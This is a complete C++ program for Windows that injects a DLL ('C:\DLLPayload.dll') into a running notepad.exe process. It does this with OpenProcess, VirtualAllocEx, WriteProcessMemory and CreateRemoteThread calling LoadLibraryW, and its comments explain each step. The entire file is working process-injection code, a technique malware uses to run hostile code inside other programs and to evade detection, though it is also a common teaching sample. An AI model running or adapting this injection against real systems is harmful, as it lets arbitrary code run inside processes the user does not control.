#include <iostream>
#include <cstdio>
#include <Windows.h>
#include <tlhelp32.h>

std::string GetLastErrorAsString()
{
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0) {
		return std::string(); //No error message has been recorded
	}

	LPSTR messageBuffer = nullptr;

	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)& messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	LocalFree(messageBuffer);

	return message;
}

DWORD FindProcessID(LPWSTR processName) {
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	PROCESSENTRY32 currentProcessEntry;
	currentProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	
	if (Process32First(hSnapshot, &currentProcessEntry)) {

		do {
			if (wcsncmp(processName, currentProcessEntry.szExeFile, wcslen(processName)) == 0) {
				return currentProcessEntry.th32ProcessID;
			}

		} while (Process32Next(hSnapshot, &currentProcessEntry));

	}
	
	return -1;
}

int main()
{
	// DLL Payload Path
	wchar_t dllPayloadPath[] = L"C:\\DLLPayload.dll";
	SIZE_T dllPayloadPathSize = sizeof(dllPayloadPath);

	// Find PID of Target Process
	LPCWSTR injectionTargetProcess = L"notepad.exe";
	DWORD injectionTargetProcessID = FindProcessID((LPWSTR) injectionTargetProcess);

	if (injectionTargetProcessID == -1) {
		wprintf(L"Could not find process: %ls", injectionTargetProcess);
		return 0;
	}

	wprintf(L"Injecting %ls into %ls (%d)\n", dllPayloadPath, injectionTargetProcess, injectionTargetProcessID);

	/*
		Open a process handle to the target process.
		We will only need permissions to allocate memory, write to that memory, and create a thread in the remote process.
	*/
	HANDLE hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, injectionTargetProcessID);
	if (hTargetProcess == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return -1;
	}

	/*
		Allocate a buffer in the target process.
	*/
	LPVOID remoteBuffer = VirtualAllocEx(hTargetProcess, NULL, sizeof(dllPayloadPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteBuffer == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return -1;
	}

	/*
		Write the path of the DLL Payload to the remote buffer in the target process.
		This is the same buffer that was allocated by VirtualAllocEx.
	*/
	if (!WriteProcessMemory(hTargetProcess, remoteBuffer, (LPVOID)dllPayloadPath, dllPayloadPathSize, NULL)) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";

		VirtualFreeEx(hTargetProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);

		return -1;
	}


	/*
		Load the DLL payload in the target process via a thread that executes LoadLibraryW.
		As a paramter LoadLibraryW accepts the remote buffer we have created with VirtualAllocEx.
	*/
	LPTHREAD_START_ROUTINE pLoadLibraryAddress = (LPTHREAD_START_ROUTINE) LoadLibraryW;
	HANDLE hThread = CreateRemoteThread(hTargetProcess, NULL, 0, pLoadLibraryAddress, remoteBuffer, 0, NULL);
	if (hThread == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
	}
	else {
		printf("Injection Complete\n");
	}

	CloseHandle(hTargetProcess);
	return 0;
}